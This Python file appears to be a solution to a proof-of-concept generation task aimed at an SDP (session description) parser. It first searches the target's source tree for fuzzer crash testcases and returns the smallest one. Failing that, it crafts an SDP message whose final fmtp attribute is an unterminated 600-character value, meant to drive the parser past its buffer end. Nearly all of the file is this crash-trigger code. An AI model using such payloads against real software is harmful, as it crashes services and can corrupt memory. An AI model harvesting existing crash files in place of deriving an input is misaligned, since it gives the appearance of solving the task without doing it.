import os
from typing import Optional


class Solution:
    def _find_existing_poc(self, src_path: str) -> Optional[bytes]:
        # Look for any PoC-like files in the source tarball
        suspicious_keywords = (
            "poc", "repro", "crash", "clusterfuzz", "minimized", "heap",
            "overflow", "buffer", "sdp", "testcase", "fuzz"
        )
        skip_exts = {
            ".c", ".h", ".cpp", ".cc", ".cxx", ".hpp", ".py", ".md", ".rst", ".txt",
            ".json", ".yml", ".yaml", ".xml", ".cmake", ".m4", ".ac", ".am", ".cfg",
            ".ini", ".proto", ".diff", ".patch", ".asm", ".s", ".S", ".ld", ".mk",
            ".dockerfile", ".bazel", ".gradle", ".java", ".go", ".rs", ".ts", ".js",
            ".rb", ".php", ".swift", ".cs", ".bat", ".sh"
        }
        # Allow small textual PoCs (including .txt/.md) as well if they look like SDP
        allow_text_if_sdp = {".txt", ".md"}

        candidates = []
        for root, _, files in os.walk(src_path):
            for fn in files:
                path = os.path.join(root, fn)
                low = fn.lower()
                if any(k in low for k in suspicious_keywords):
                    ext = os.path.splitext(fn)[1].lower()
                    if ext in skip_exts and ext not in allow_text_if_sdp:
                        continue
                    try:
                        st = os.stat(path)
                        if st.st_size == 0 or st.st_size > 1024 * 1024:
                            continue
                        with open(path, "rb") as f:
                            data = f.read()
                        # If it's text, check whether it resembles SDP
                        if ext in allow_text_if_sdp:
                            ldata = data.lower()
                            if b"v=" in ldata or b"m=" in ldata or b"a=" in ldata or b"sdp" in ldata:
                                candidates.append((st.st_size, data))
                                continue
                        # Otherwise accept the file as a candidate PoC
                        candidates.append((st.st_size, data))
                    except Exception:
                        continue
        if candidates:
            # Choose the smallest candidate to increase the chance of being a minimized PoC
            candidates.sort(key=lambda x: x[0])
            return candidates[0][1]
        return None

    def _craft_generic_sdp_trigger(self) -> bytes:
        # Generic SDP payload designed to hit attribute parsing logic and end without a delimiter.
        # The last line lacks a terminating newline and contains a parameter without '=' to
        # force scanning past the end if boundaries are not checked.
        head_lines = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=-",
            "t=0 0",
            "c=IN IP4 0.0.0.0",
            "m=audio 9 RTP/AVP 111 0",
            "a=rtpmap:111 opus/48000/2",
            "a=sendrecv",
            "a=ptime:20",
            "a=maxptime:60",
            "a=fmtp:111 minptime=10; useinbandfec=1; stereo=1; sprop-stereo=1; maxaveragebitrate=510000; cbr=1"
        ]
        # Create a long attribute value without '=' or ';' to trigger the missing end check.
        # Ensure there is a space after payload type 111 to enter param scanning.
        tail_param = "a=fmtp:111 " + ("X" * 600) + "TrailingParamWithoutEquals"
        sdp = "\r\n".join(head_lines) + "\r\n" + tail_param
        return sdp.encode("ascii", errors="ignore")

    def solve(self, src_path: str) -> bytes:
        # Try to find an existing PoC inside the source; fallback to crafted generic trigger.
        try:
            existing = self._find_existing_poc(src_path)
            if existing:
                return existing
        except Exception:
            pass
        return self._craft_generic_sdp_trigger()